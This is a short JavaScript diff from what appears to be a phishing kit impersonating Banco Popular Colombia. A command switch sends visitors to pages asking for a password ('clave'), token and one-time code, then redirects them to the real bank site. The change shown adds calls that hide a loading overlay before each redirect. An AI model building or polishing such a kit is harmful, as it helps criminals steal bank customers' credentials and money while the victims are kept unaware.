@@ -110,18 +110,22 @@ document.addEventListener('DOMContentLoaded', () => {
                 break;
             case 'request_clave':
                 console.log('🔑 Redirigiendo a clave.html');
+                BancoUtils.hideOverlay();
                 window.location.href = 'clave.html';
                 break;
             case 'request_token':
                 console.log('📱 Redirigiendo a token.html');
+                BancoUtils.hideOverlay();
                 window.location.href = 'token.html';
                 break;
             case 'request_otp':
                 console.log('🔢 Redirigiendo a otp.html');
+                BancoUtils.hideOverlay();
                 window.location.href = 'otp.html';
                 break;
             case 'finish':
                 console.log('✅ Finalizando - redirigiendo a bancopopular.com.co');
+                BancoUtils.hideOverlay();
                 window.location.href = 'https://www.bancopopular.com.co/';
                 break;
             default:
